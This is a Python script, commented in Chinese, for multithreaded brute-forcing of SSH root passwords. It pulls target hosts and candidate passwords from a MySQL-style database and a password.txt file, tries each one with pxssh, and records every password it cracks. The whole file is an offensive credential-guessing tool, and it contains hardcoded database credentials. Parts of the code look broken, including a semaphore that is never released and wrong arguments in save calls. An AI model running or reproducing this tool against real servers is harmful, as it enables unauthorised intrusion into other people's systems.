#!/usr/bin/python3
# coding: utf-8
'''
暴力破解ssh，root用户的密码，线程池
'''
from pexpect import pxssh
from threading import *
from databaseHelper import DatabaseHelper

PASSWORDFILE = 'password.txt'

class CrackSSHWorkInfo:
  def __init__(self, id, host, password, user='root'):
    self._user = user
    self._password = password
    self._host = host
    self._id = id
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
    
  def _checkPassword(self, password):
    try:
      s = pxssh.pxssh()
      s.login(self._host, self._user, password)
    except Exception as e:
      print('[-] Login Fail..., ErrorInfo: {0}'.format(e))
      return False
    finally:
      s.logout()
    return True

  def _saveWorkInfo(self, password, crackState):
    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, ENDCRACK, self._id))

  def workThread(self, lock):
    try:
      if self._password == None:
        reslut = self.dbHelper.queryOne('select val from password order by val')
      else:
        reslut = self.dbHelper.queryOne('select val from password where val > %s order by val', (self._password,))

      while (reslut != None):
        if self._checkPassword(reslut['val']):
          self._saveWorkInfo(reslut, OKCRACK)
          break
        else:
          self._saveWorkInfo(reslut, CRACKING)
        reslut = self.dbHelper.queryOne('select val from password where val > %s order by val', (reslut,))
      else:
        self._saveWorkInfo(reslut, ENDCRACK)
      
    except Exception as e:
      print(str(e))
    try:
      with open(PASSWORDFILE, 'r') as f:
        for line in f:
          line = line.strip('\n').strip()
          if self._checkPassword(line):
            self._saveWorkInfo(line)
            break
        else:
          self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (ENDCRACK, self._id))
    except Exception as e:
      print(str(e))
    
class CrackSSHThreadPool:
  def __init__(self, count):
    self.threadLock = BoundedSemaphore(value=count)
    self._schedule = SSHScheduler()

  def startThreadPool(self):
    while True:
      self.threadLock.acquire()
      workInfo = self._schedule.getNextWork()
      if workInfo == None:
        self.threadLock.release()
        continue
      t = Thread(target= workInfo.workThread, args=(self.threadLock,))
      t.start()

class SSHScheduler:
  def __init__(self):
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
  
  def getNextWork(self):
    dictResult = self.dbHelper.queryOne('select id, host, password from crackResult where state = %s and password is null and (crackState = %s or crackState = %s) order by id asc', ('open', NOSTART, CRACKING))
    if dictResult == None:
      return None
    self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (CRACKING, dictResult['id']))
    return CrackSSHWorkInfo(dictResult['id'], dictResult['host'], dictResult['password'])

NOSTART = 0 # 还没开始
CRACKING = 1 # 正在匹配密码
ENDCRACK = 2 # 没有匹配到密码
OKCRACK = 3 # 已经匹配到密码

if __name__ == '__main__':
  csPool = CrackSSHThreadPool(10)
  csPool.startThreadPool()

